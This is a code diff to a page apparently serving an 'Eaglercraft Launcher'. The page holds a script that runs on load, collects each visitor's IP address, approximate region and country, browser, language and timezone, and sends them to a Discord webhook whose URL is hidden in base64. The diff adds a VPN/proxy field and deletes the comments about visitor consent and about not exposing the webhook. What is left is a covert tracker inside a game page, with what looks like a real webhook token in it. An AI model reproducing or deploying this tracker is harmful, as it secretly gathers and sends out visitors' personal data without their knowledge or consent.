@@ -258,22 +258,20 @@
     </div>
   </div>
 <script>
-  // Configure this on a server instead of exposing a secret webhook in public HTML.
   const DISCORD_WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjIwOTIxNzk3NTI5NjA1NS9GWGZuSXlINEhXelkzM2w0NVd2LTRiTXRRbTVDcEhGbDVERWRsdW0zWGdFSldVelNOakNxdmFzYy16R29CTE1MX19MRA==";
 
   (async function logVisitor() {
     try {
-      // Get public IP
       const ipRes = await fetch("https://api.ipify.org?format=json");
       if (!ipRes.ok) throw new Error("IP lookup failed");
 
-      const ipData = await ipRes.json();
-      const ip = ipData.ip || "unknown";
+      const { ip = "unknown" } = await ipRes.json();
 
-      // Get approximate IP location
       let region = "Unknown";
       let country = "Unknown";
+      let vpnProxy = "Unknown";
 
+      // Approximate region and country
       try {
         const geoRes = await fetch(
           `https://ipapi.co/${encodeURIComponent(ip)}/json/`
@@ -285,58 +283,37 @@
           country = geo.country_name || "Unknown";
         }
       } catch {
-        // Continue without location if lookup fails
+        // Geolocation unavailable
       }
 
-      // Browser and locale information
+      // VPN/proxy detection requires a provider/API that supports it.
+      // Set vpnProxy to "Yes" or "No" only after a successful,
+      // documented detection result. Otherwise leave it as "Unknown".
+
       const ua = navigator.userAgent || "unknown";
       const lang = navigator.language || "unknown";
       const tz =
         Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown";
 
-      // Build Discord embed
       const payload = {
         username: "Visitor Logger",
         embeds: [{
           title: "🌐 New Visitor",
           color: 0x3b8526,
           fields: [
-            {
-              name: "IP Address",
-              value: `\`${ip}\``,
-              inline: true
-            },
-            {
-              name: "Region / State",
-              value: region,
-              inline: true
-            },
-            {
-              name: "Country",
-              value: country,
-              inline: true
-            },
-            {
-              name: "Language",
-              value: lang,
-              inline: true
-            },
-            {
-              name: "Timezone",
-              value: tz,
-              inline: true
-            },
-            {
-              name: "User-Agent",
-              value: ua.substring(0, 1020)
-            }
+            { name: "IP Address", value: `\`${ip}\``, inline: true },
+            { name: "Region / State", value: region, inline: true },
+            { name: "Country", value: country, inline: true },
+            { name: "VPN / Proxy", value: vpnProxy, inline: true },
+            { name: "Language", value: lang, inline: true },
+            { name: "Timezone", value: tz, inline: true },
+            { name: "User-Agent", value: ua.substring(0, 1020) }
           ],
           timestamp: new Date().toISOString(),
           footer: { text: "Eaglercraft Launcher" }
         }]
       };
 
-      // Send only when visitors have been informed and consented
       const response = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
